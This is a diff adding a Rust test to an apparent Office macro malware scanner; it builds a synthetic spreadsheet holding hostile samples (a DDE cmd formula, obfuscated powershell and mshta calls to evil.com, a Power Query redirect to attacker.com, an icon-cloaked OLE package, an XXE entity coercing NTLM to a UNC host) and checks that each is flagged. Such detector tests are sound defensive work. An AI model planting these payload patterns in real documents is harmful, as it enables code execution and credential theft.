@@ -4818,3 +4818,181 @@ fn e2e_smartart_mailmerge_querytable_and_math_threat_inspection() {
         "JSON missing VBA-CELL-046"
     );
 }
+
+#[test]
+fn e2e_powerquery_moniker_namespace_and_math_threat_inspection() {
+    let src = "Sub Safe()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project(
+        "PowerQueryContainerProj",
+        &[("ThisWorkbook", src, &pcode)],
+        &["Safe"],
+    );
+
+    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\
+        <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\
+        <Default Extension=\"xml\" ContentType=\"application/xml\"/>\
+        <Default Extension=\"bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/>\
+        <Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml\"/>\
+        <Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/>\
+    </Types>";
+
+    let root_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+        <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/>\
+    </Relationships>";
+
+    let workbook = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">\
+        <sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId1\"/></sheets>\
+    </workbook>";
+
+    let workbook_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+        <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/>\
+        <Relationship Id=\"rId2\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/>\
+    </Relationships>";
+
+    // Worksheet with advanced math functions (COMBIN, PERMUT, LOG, SUMPRODUCT) de-obfuscating execution payloads
+    let sheet1 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">\
+        <sheetData>\
+            <row r=\"1\">\
+                <c r=\"A1\"><f>IF(COMBIN(5, 2)=10, &quot;cmd|'/c calc'!A1&quot;, &quot;&quot;)</f></c>\
+                <c r=\"B1\"><f>CONCAT(IF(PERMUT(4, 2)=12, &quot;powershell&quot;, &quot;&quot;), IF(LOG(100)=2, &quot; -nop&quot;, &quot;&quot;))</f></c>\
+                <c r=\"C1\"><f>IF(SUMPRODUCT({10, 2}, {3, 5})=40, &quot;mshta http://evil.com/p.hta&quot;, &quot;&quot;)</f></c>\
+            </row>\
+        </sheetData>\
+    </worksheet>";
+
+    // Power Query / Data Mashup part with Web.Page and smuggled Base64 PE binary (VBA-CELL-047)
+    let power_query_mashup = "<DataMashup xmlns=\"http://schemas.microsoft.com/DataMashup\">\
+        section Section1;\
+        shared Query1 = let\
+            Source = Web.Page(\"<script>window.location='http://attacker.com/malware.hta';</script>\"),\
+            BinaryPayload = Binary.FromText(\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAA\", BinaryEncoding.Base64)\
+        in\
+            Source;\
+    </DataMashup>";
+
+    // OLE Object with DrawAspect="Icon" cloaking payload.exe and weaponized Packager CLSID (VBA-CELL-048)
+    let ole_activation_drawing = "<xml xmlns:o=\"urn:schemas-microsoft-com:office:office\">\
+        <o:OLEObject DrawAspect=\"Icon\" UpdateMode=\"Always\" ProgID=\"Package\" r:id=\"rId99\">\
+            <o:LinkType>Picture</o:LinkType>\
+            <o:LockedField>False</o:LockedField>\
+            <o:FieldCodes>payload.exe</o:FieldCodes>\
+        </o:OLEObject>\
+        <o:OLEObject Type=\"Embed\" ProgID=\"{f20be578-230c-1380-1a29-e3f84c071110}\"/>\
+    </xml>";
+
+    // XML part with remote UNC namespace coercion and XXE DTD declaration (VBA-CELL-049)
+    let namespace_coercion = "<?xml version=\"1.0\"?>\
+    <!DOCTYPE test [ <!ENTITY % xxe SYSTEM \"\\\\ntlm.attacker.example.com\\share\\schema.xsd\"> %xxe; ]>\
+    <root xmlns:spoof=\"\\\\ntlm.attacker.example.com\\share\\schema.xsd\">\
+        <data>test</data>\
+    </root>";
+
+    let xlsm_bytes = synthesize_zip(&[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", root_rels.as_bytes()),
+        ("xl/workbook.xml", workbook.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", workbook_rels.as_bytes()),
+        ("xl/vbaProject.bin", &cfb),
+        ("xl/worksheets/sheet1.xml", sheet1.as_bytes()),
+        ("customXml/item1.xml", power_query_mashup.as_bytes()),
+        (
+            "xl/drawings/drawing1.xml",
+            ole_activation_drawing.as_bytes(),
+        ),
+        ("customXml/item2.xml", namespace_coercion.as_bytes()),
+    ]);
+
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&xlsm_bytes, &options).expect("inspection should succeed");
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify Power Query & Data Mashup threat detection (VBA-CELL-047)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "PowerQueryFormulaOrMashupAnomaly"
+                && t.severity == "Critical"
+                && (t.formula.contains("Web.Page")
+                    || t.formula.contains("smuggled Windows executable"))),
+        "Should detect PowerQueryFormulaOrMashupAnomaly (VBA-CELL-047): {threats:?}"
+    );
+
+    // 2. Verify OLE Object Moniker & Package Activation threat detection (VBA-CELL-048)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "PackageMonikerOrActivationAnomaly"
+                && (t.formula.contains("payload.exe")
+                    || t.formula.contains("Packager Shell Object")
+                    || t.formula.contains("automatic silent activation"))),
+        "Should detect PackageMonikerOrActivationAnomaly (VBA-CELL-048): {threats:?}"
+    );
+
+    // 3. Verify XML Namespace Cloaking & Schema Spoofing detection (VBA-CELL-049)
+    assert!(
+        threats.iter().any(
+            |t| t.threat_kind == "NamespaceCloakingOrSchemaSpoofingAnomaly"
+                && t.severity == "Critical"
+                && (t.formula.contains("remote UNC path")
+                    || t.formula.contains("XXE injection vector"))
+        ),
+        "Should detect NamespaceCloakingOrSchemaSpoofingAnomaly (VBA-CELL-049): {threats:?}"
+    );
+
+    // 4. Verify mathematical formula de-obfuscation in cells
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && (t.threat_kind == "DDE"
+                || t.threat_kind == "DDEExecutionFormula"
+                || t.threat_kind == "DeobfuscatedThreat")
+            && t.formula.contains("cmd")),
+        "Cell A1 should resolve DDE cmd execution threat through COMBIN evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("powershell")),
+        "Cell B1 should resolve powershell threat through PERMUT and LOG evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "C1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("mshta")),
+        "Cell C1 should resolve mshta threat through SUMPRODUCT evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-047, VBA-CELL-048, VBA-CELL-049
+    let sarif = inspection_to_sarif(
+        &inspection,
+        "file:///test/powerquery_moniker_namespace.xlsm",
+    );
+    assert!(
+        sarif.contains("VBA-CELL-047"),
+        "SARIF must contain VBA-CELL-047 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-048"),
+        "SARIF must contain VBA-CELL-048 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-049"),
+        "SARIF must contain VBA-CELL-049 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-047, VBA-CELL-048, VBA-CELL-049
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-047\""),
+        "JSON missing VBA-CELL-047"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-048\""),
+        "JSON missing VBA-CELL-048"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-049\""),
+        "JSON missing VBA-CELL-049"
+    );
+}
